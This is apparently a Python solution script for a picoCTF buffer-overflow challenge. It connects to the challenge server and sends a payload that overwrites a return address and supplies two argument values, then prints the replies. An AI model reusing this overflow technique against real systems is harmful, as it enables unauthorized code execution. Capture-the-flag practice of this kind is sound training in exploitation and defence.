import socket
import sys
import re
import select
import random

def main():
    MAX = 999999
    server_address = ("saturn.picoctf.net", 56420)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('connecting to %s port %s' % server_address, file=sys.stderr)
    sock.connect(server_address)
    data = socket_receive(sock)
    print(data.decode("utf-8"))
    pwn_string = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBCC\x96\x92\x04\x08CCCC\x0D\xF0\xFE\xCA\x0D\xF0\x0D\xF0\n'
    socket_send(sock, pwn_string)
    data = socket_receive(sock)
    print(data)
    data = socket_receive(sock)
    print(data)
    sock.close()


def socket_receive(sock):
    data = b''
    try:
        amount_expected = 4096
        ready = select.select([sock], [], [], 2)
        data = sock.recv(amount_expected)
    finally:
        return data

def socket_send(sock, data):
    try:
        sock.send(data)
    except:
        print("Couldn't send data")


if __name__ == "__main__":
    main()